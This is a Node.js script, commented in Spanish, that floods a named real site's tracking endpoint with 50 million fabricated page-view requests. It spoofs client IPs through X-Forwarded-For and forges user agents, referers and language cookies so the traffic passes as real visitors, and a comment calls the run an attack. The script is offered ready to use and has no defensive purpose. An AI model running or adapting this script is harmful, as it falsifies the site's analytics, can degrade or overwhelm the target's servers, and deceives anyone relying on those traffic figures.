/*
 * ROR World "MACH 10" Sender 🚀
 * Page Views Only | DNS Cached | Socket Destroy
 Simon
 */

const https = require("https");
const dns = require("dns");

// --- CONFIGURACIÓN ---
const TOTAL_VISITAS = 50000000; // 50 Millones
const MAX_CONCURRENCY = 150;    
const TARGET_HOST = "ror.world";
const TARGET_PATH = "/v1/track/add";

// Cacheamos la IP una sola vez al inicio para no gastar CPU en DNS
let TARGET_IP = null;

const agent = new https.Agent({
  keepAlive: true,
  maxSockets: MAX_CONCURRENCY,
  maxFreeSockets: 50,
  timeout: 1000,       // 1s es agresivo, pero necesario para velocidad
  scheduling: 'lifo'
});

const LANGUAGES = ["english", "arabic", "chinese"]; 
const LANG_CODE_MAP = { "arabic": "ar", "english": "en", "chinese": "zh-CN" };

function randomIP() {
  return `${Math.floor(Math.random() * 254) + 1}.${Math.floor(Math.random() * 254)}.${Math.floor(Math.random() * 254)}.${Math.floor(Math.random() * 254)}`;
}
const getRandom = (arr) => arr[Math.floor(Math.random() * arr.length)];

function sendRequest(action, lang, isoCode, ip) {
  return new Promise((resolve) => {
    const payload = JSON.stringify({ id: lang, action: action });

    const req = https.request(
      {
        hostname: TARGET_IP || TARGET_HOST, // Usamos la IP directa si ya la tenemos
        port: 443,
        path: TARGET_PATH,
        method: "POST",
        agent,
        headers: {
          "Host": TARGET_HOST, // El Host header sigue siendo necesario
          "Content-Type": "application/json",
          "Content-Length": Buffer.byteLength(payload),
          "X-Forwarded-For": ip,
          "User-Agent": `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(Math.random()*10)+135}.0.0.0 Safari/537.36`,
          "Origin": `https://${TARGET_HOST}`,
          "Referer": `https://${TARGET_HOST}/${lang}`,
          "Cookie": `googtrans=/en/${isoCode}`,
          "Connection": "keep-alive"
        },
        // Forzamos que no chequee DNS si usamos la IP directa
        servername: TARGET_HOST 
      },
      (res) => {
        // 🔥 OPTIMIZACIÓN MÁXIMA: 
        // Si es 200, destruimos inmediatamente. No leemos nada.
        const success = res.statusCode === 200;
        res.destroy(); 
        resolve(success);
      }
    );

    // Timeout agresivo: Si en 1s no hay respuesta, matar.
    req.on('timeout', () => {
        req.destroy();
        resolve(false);
    });

    req.on("error", () => resolve(false));
    req.write(payload);
    req.end();
  });
}

async function processUserSession() {
  const lang = getRandom(LANGUAGES);
  const isoCode = LANG_CODE_MAP[lang] || "en";
  const ip = randomIP();
  
  // Solo 1 petición (Page View) para máxima velocidad
  // Al no usar Promise.all con array vacío, ahorramos overhead
  const success = await sendRequest("page_view", lang, isoCode, ip);
  return success ? 1 : 0;
}

// Resolver DNS antes de empezar el ataque
function resolveDNS() {
    return new Promise((resolve) => {
        dns.lookup(TARGET_HOST, (err, address) => {
            if (err) console.log("⚠️ No se pudo resolver DNS, usando Hostname...");
            else {
                TARGET_IP = address;
                console.log(`🔗 DNS Resuelto: ${TARGET_HOST} -> ${TARGET_IP}`);
            }
            resolve();
        });
    });
}

async function main() {
  await resolveDNS();
  
  console.log(`🚀 Iniciando MACH 10 Sender`);
  console.log(`🎯 Objetivo: ${TOTAL_VISITAS.toLocaleString()} visitas`);
  console.log(`⚡ Concurrencia: ${MAX_CONCURRENCY} | Modo: Page View Only`);

  const start = Date.now();
  let activeWorkers = 0;
  let usersProcessed = 0;
  let totalSuccessfulRequests = 0;
  
  return new Promise((resolve) => {
    const refill = () => {
      while (activeWorkers < MAX_CONCURRENCY && usersProcessed < TOTAL_VISITAS) {
        activeWorkers++;
        usersProcessed++;
        
        processUserSession()
          .then((reqsOk) => {
            totalSuccessfulRequests += reqsOk;
            activeWorkers--;
            
            // Log cada 2000 para no ensuciar la consola y gastar CPU pintando texto
            if (usersProcessed % 2000 === 0) {
               const seconds = (Date.now() - start) / 1000;
               const speed = (totalSuccessfulRequests / seconds).toFixed(0);
               process.stdout.write(`\r⚡ Velocidad: ${speed} req/s | Enviados: ${usersProcessed.toLocaleString()}`);
            }
            
            refill(); 
          })
          .catch(() => {
            activeWorkers--;
            refill();
          });
      }
      
      if (usersProcessed >= TOTAL_VISITAS && activeWorkers === 0) {
        resolve();
      }
    };

    refill(); 
  }).then(() => {
    const duration = (Date.now() - start) / 1000;
    console.log(`\n\n🏁 Finalizado en ${duration.toFixed(2)}s`);
    console.log(`📦 Total Exitosas: ${totalSuccessfulRequests.toLocaleString()}`);
    console.log(`⚡ Promedio: ${(totalSuccessfulRequests / duration).toFixed(1)} req/s`);
  });
}

main();